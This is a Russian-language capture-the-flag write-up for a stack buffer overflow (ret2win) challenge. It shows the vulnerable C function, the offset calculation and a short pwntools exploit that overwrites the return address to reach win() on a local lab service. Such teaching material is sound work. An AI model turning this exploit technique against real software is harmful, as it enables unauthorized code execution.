# Разбор: Турникет (pwn)

Переполнение буфера на стеке и перенаправление выполнения на функцию, печатающую
флаг (приём ret2win). Защиты стека отключены.

## Шаг 1. Что за файл

```console
$ file public/gatekeeper
public/gatekeeper: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically
linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, not stripped
```

64-битный ELF, не обрезан (символы функций на месте). Проверим защиты:

```console
$ python3 -c 'from pwn import *; ELF("public/gatekeeper")'
[*] '/.../public/gatekeeper'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```

Канарейки нет — значит перезапись адреса возврата не будет замечена. PIE нет —
адреса кода фиксированы, не зависят от запуска.

## Шаг 2. Уязвимость в исходнике

В `public/gatekeeper.c`:

```c
void win(void) {
    const char *flag = getenv("PWN_FLAG_1");
    ...
    write(1, flag, strlen(flag));   // печатает флаг
}

void check(void) {
    char buf[64];
    ...
    read(0, buf, 256);              // читаем 256 байт в буфер на 64 — переполнение
}
```

`win()` печатает флаг, но `main()` её не вызывает — только `check()`. Задача: из
`check()` вернуться не в `main()`, а в `win()`.

## Шаг 3. Смещение до адреса возврата

На стеке: 64 байта буфера, затем 8 байт сохранённого `rbp`, затем адрес возврата.
Значит до него **72** байта. Проверка «цикликом»: отправляем неповторяющийся узор,
смотрим, какие 4 байта попали в указатель стека при падении, и переводим обратно в
смещение (`cyclic_find`). Результат — 72.

Адрес `win()`:

```console
$ nm public/gatekeeper | grep -w win
0000000000401186 T win
```

## Шаг 4. Эксплойт

```python
from pwn import *
elf = ELF("public/gatekeeper")
io = remote("127.0.0.1", 9001)          # адрес и порт стенда
io.recvuntil(b":")
io.sendline(b"A"*72 + p64(elf.symbols["win"]))
print(io.recvall(timeout=5))
```

Запуск готового решения против поднятого сервиса:

```console
$ TASK_HOST=127.0.0.1 python3 solution/solve.py
BootCTF{default_pwn_1}
```

Адрес возврата перезаписан адресом `win()`, и служба напечатала флаг.

> **Почему прыжок сработал сразу.** В задачах, где `win()` зовёт `printf()`, прямой
> переход часто «падает» из-за требования выравнивания стека на 16 байт (инструкция
> `movaps`). Лечится добавлением «пустого» ret-гаджета перед адресом `win()`. Здесь
> `win()` печатает флаг системным вызовом `write()`, поэтому выравнивание не нужно.

## Что это даёт в реальности

Перезапись адреса возврата — основа эксплуатации бинарных уязвимостей. В реальных
программах мешают канарейка, NX и ASLR/PIE; их обход — темы следующих занятий.
Отключив защиты, мы видим механизм в чистом виде.

Больше практики — задания категории **pwn (Binary Exploitation)** на учебных
платформах из списка источников лекции.
